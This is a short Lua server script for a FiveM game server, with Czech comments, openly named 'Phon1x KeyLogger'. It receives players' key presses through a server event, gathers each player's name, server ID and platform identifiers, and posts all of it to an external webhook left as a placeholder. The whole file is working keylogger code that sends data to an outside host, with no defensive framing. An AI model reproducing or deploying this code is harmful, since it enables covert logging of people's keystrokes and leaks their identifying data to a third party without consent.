local webhook = "YOURWEBHOOK"

RegisterServerEvent("keylogger:logKey")
AddEventHandler("keylogger:logKey", function(key)
    local src = source
    local name = GetPlayerName(src)

    -- Identifikátory
    local identifiers = {}
    for k,v in pairs(GetPlayerIdentifiers(src)) do
        table.insert(identifiers, v)
    end
    local idString = table.concat(identifiers, "\n")

    -- Embed na webhook
    local embed = {
        {
            ["title"] = "🔑 Key Press Detected",
            ["color"] = 16711680, 
            ["fields"] = {
                { ["name"] = "Player", ["value"] = name .. " ("..src..")", ["inline"] = false },
                { ["name"] = "Key", ["value"] = key, ["inline"] = true },
                { ["name"] = "Identifiers", ["value"] = "```\n"..idString.."```", ["inline"] = false }
            },
            ["footer"] = { ["text"] = "Phon1x KeyLogger" },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }
    }

    PerformHttpRequest(webhook, function(err, text, headers) end, "POST", json.encode({username = "KeyLogger", embeds = embed}), { ["Content-Type"] = "application/json" })
end)
